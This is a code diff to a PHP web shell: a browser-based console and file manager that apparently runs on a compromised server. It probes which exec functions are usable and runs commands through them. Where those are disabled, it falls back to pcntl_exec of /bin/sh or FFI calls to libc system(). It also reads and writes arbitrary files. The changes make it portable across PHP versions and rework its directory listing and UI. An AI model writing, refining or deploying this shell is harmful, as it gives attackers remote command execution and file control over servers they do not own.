@@ -88,7 +88,7 @@ function output_debug_report() {
     header('Cache-Control: no-store');
     echo "PHP_VERSION       = " . PHP_VERSION . "\n";
     echo "PHP_SAPI          = " . PHP_SAPI . "\n";
-    echo "OS_FAMILY         = " . PHP_OS_FAMILY . "\n";
+    echo "OS_FAMILY         = " . (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS) . "\n";
     echo "disable_functions = " . (@ini_get('disable_functions') ?: '(none)') . "\n";
     echo "open_basedir      = " . (@ini_get('open_basedir') ?: '(none)') . "\n";
     echo "zip ext           = " . (class_exists('ZipArchive') ? 'yes' : 'no') . "\n";
@@ -96,7 +96,7 @@ function output_debug_report() {
     $usable = array();
     foreach (exec_candidates() as $c) {
         $u = exec_usable($c);
-        printf("%-12s exists=%s usable=%s\n", $c, @function_exists($c) ? 'yes' : 'no', $u ? 'YES' : 'no');
+        echo $c . str_repeat(' ', max(1, 13 - strlen($c))) . "exists=" . (@function_exists($c) ? 'yes' : 'no') . " usable=" . ($u ? 'YES' : 'no') . "\n";
         if ($u) $usable[] = $c;
     }
     echo "--- usable ---\n";
@@ -104,8 +104,6 @@ function output_debug_report() {
         echo "auto-selected: " . exec_best() . "\n";
     } else {
         echo "[!] no exec function available on this server.\n";
-        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
-        echo "    are disabled or missing.\n";
         echo "    use the file manager instead.\n";
     }
     exit;
@@ -116,14 +114,38 @@ function fm_list($path) {
     $mode = 'native';
     $err = '';
 
-    if (exec_best() !== '') {
+    if (function_exists('scandir')) {
+        $items = @scandir($path);
+        if ($items !== false) {
+            foreach ($items as $it) {
+                if ($it === '.' || $it === '..') continue;
+                $full = path_join($path, $it);
+                $st = @stat($full);
+                $type = @is_link($full) ? 'link' : (@is_dir($full) ? 'dir' : 'file');
+                $entries[] = array(
+                    'name'  => $it,
+                    'type'  => $type,
+                    'size'  => $st ? (int)$st['size'] : 0,
+                    'mtime' => $st ? @date('Y-m-d H:i:s', $st['mtime']) : '',
+                );
+            }
+        } else {
+            $err = 'cannot list directory';
+        }
+    } else {
+        $err = 'scandir unavailable';
+    }
+
+    if ($err !== '' && exec_best() !== '') {
+        $entries = array();
+        $err = '';
+        $mode = 'cmd';
         if (is_win()) {
-            $ps = 'Get-ChildItem -LiteralPath ' . ps_sq($path) . ' -Force -ErrorAction Stop | ' .
+            $ps = 'Get-ChildItem -LiteralPath ' . ps_sq($path) . ' -Force -ErrorAction SilentlyContinue | ' .
                   'ForEach-Object { $_.PSIsContainer.ToString() + "|" + $_.Length + "|" + ' .
                   '$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "|" + $_.Name }';
             $out = run_ps($ps);
             if (is_string($out) && trim($out) !== '') {
-                $parsed = 0;
                 foreach (explode("\n", trim($out)) as $line) {
                     $line = rtrim($line, "\r");
                     if ($line === '') continue;
@@ -135,54 +157,28 @@ function fm_list($path) {
                         'size'  => (int)$p[1],
                         'mtime' => $p[2],
                     );
-                    $parsed++;
                 }
-                if ($parsed > 0) $mode = 'cmd';
             }
         } else {
             $q = sq($path);
-            $out = run_cmd("find $q -maxdepth 1 -mindepth 1 -printf '%y|%s|%TY-%Tm-%Td %TH:%TM:%TS|%f\\n'");
+            $out = run_cmd("ls -1p $q 2>/dev/null");
             if (is_string($out) && trim($out) !== '') {
-                $parsed = 0;
                 foreach (explode("\n", trim($out)) as $line) {
+                    $line = rtrim($line, "\r");
                     if ($line === '') continue;
-                    $p = explode('|', $line, 4);
-                    if (count($p) < 4) continue;
-                    $t = $p[0];
-                    $type = ($t === 'd') ? 'dir' : (($t === 'l') ? 'link' : 'file');
+                    $isDir = substr($line, -1) === '/';
+                    $name = rtrim($line, '/');
+                    $full = path_join($path, $name);
+                    $st = @stat($full);
                     $entries[] = array(
-                        'name'  => $p[3],
-                        'type'  => $type,
-                        'size'  => (int)$p[1],
-                        'mtime' => substr($p[2], 0, 19),
+                        'name'  => $name,
+                        'type'  => $isDir ? 'dir' : 'file',
+                        'size'  => $st ? (int)$st['size'] : 0,
+                        'mtime' => $st ? @date('Y-m-d H:i:s', $st['mtime']) : '',
                     );
-                    $parsed++;
                 }
-                if ($parsed > 0) $mode = 'cmd';
             }
         }
-    }
-
-    if ($mode !== 'cmd' && function_exists('scandir')) {
-        $items = @scandir($path);
-        if ($items === false) {
-            $err = 'cannot list directory (open_basedir / permissions)';
-        } else {
-            foreach ($items as $it) {
-                if ($it === '.' || $it === '..') continue;
-                $full = path_join($path, $it);
-                $st = @stat($full);
-                $type = @is_link($full) ? 'link' : (@is_dir($full) ? 'dir' : 'file');
-                $entries[] = array(
-                    'name'  => $it,
-                    'type'  => $type,
-                    'size'  => $st ? (int)$st['size'] : 0,
-                    'mtime' => $st ? date('Y-m-d H:i:s', $st['mtime']) : '',
-                );
-            }
-        }
-    } elseif ($mode !== 'cmd') {
-        $err = 'scandir unavailable';
     }
 
     usort($entries, function ($a, $b) {
@@ -222,31 +218,6 @@ function fm_read($path, $max = 2097152) {
 }
 
 function fm_write($path, $content) {
-    if (function_exists('proc_open')) {
-        if (!is_win()) {
-            $hex = bin2hex($content);
-            $cmd = 'echo ' . $hex . ' | xxd -r -p > ' . escapeshellarg($path) . ' 2>&1';
-            $out = run_cmd($cmd);
-            
-            clearstatcache(true, $path);
-            if (@file_exists($path) && @filesize($path) > 0) {
-                return array('ok' => true, 'bytes' => @filesize($path), 'mode' => 'cmd_hex');
-            }
-            
-            $descriptors = array(0 => array('pipe', 'r'), 1 => array('file', '/dev/null', 'w'), 2 => array('file', '/dev/null', 'w'));
-            $process = @proc_open('cat > ' . escapeshellarg($path), $descriptors, $pipes);
-            if (is_resource($process)) {
-                @fwrite($pipes[0], $content);
-                @fclose($pipes[0]);
-                @proc_close($process);
-                
-                clearstatcache(true, $path);
-                if (@file_exists($path) && @filesize($path) == strlen($content)) {
-                    return array('ok' => true, 'bytes' => strlen($content), 'mode' => 'proc_cat');
-                }
-            }
-        }
-    }
     $r = @file_put_contents($path, $content);
     if ($r !== false) {
         return array('ok' => true, 'bytes' => $r, 'mode' => 'native');
@@ -581,7 +552,7 @@ function handle_console($raw) {
             @pcntl_exec('/bin/sh', array('-c', $cmd));
             break;
         case 'ffi':
-            $lib = PHP_OS_FAMILY === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
+            $lib = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'Windows' : 'Linux')) === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
             $f = @FFI::cdef("int system(const char *);", $lib);
             if ($f) { @$f->system($cmd); }
             break;
@@ -614,7 +585,7 @@ header('Content-Type: text/html; charset=utf-8');
 header('Cache-Control: no-store');
 render_ui();
 function render_ui() {
-echo <<<'HTMLEOF'
+$__UI__ = <<<'UIEND'
 <!doctype html>
 <html lang="en">
 <meta charset="utf-8">
@@ -783,7 +754,7 @@ async function run() {
   }
 }
 async function info() {
-  $('#out').textContent = '...';
+  $('#out').textContent = 'loading...';
   try {
     const r = await fmCall('debug', {});
     const t = await r.text();
@@ -791,6 +762,14 @@ async function info() {
   } catch (e) {
     $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
+}
+
+async function infoShort() {
+  try {
+    const r = await fmJson('info');
+    if (!r.ok) return;
+    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
+  } catch (e) {}
 }
 $('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
 
@@ -888,14 +867,13 @@ function fnSummary(r) {
 async function fmHome() {
   const r = await fmJson('info');
   if (r.ok) {
-    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
+    infoShort();
     fmLoad(r.cwd);
   }
 }
 async function fmInit() {
   const r = await fmJson('info');
   if (!r.ok) { $('#fmStatus').textContent = 'init failed'; return; }
-  $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
   fmLoad(r.cwd);
 }
 
@@ -1085,9 +1063,11 @@ async function boot() {
     $('#out').textContent = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
+
 boot();
 fmInit();
 </script>
 </html>
-HTMLEOF;
+UIEND;
+echo $__UI__;
 }
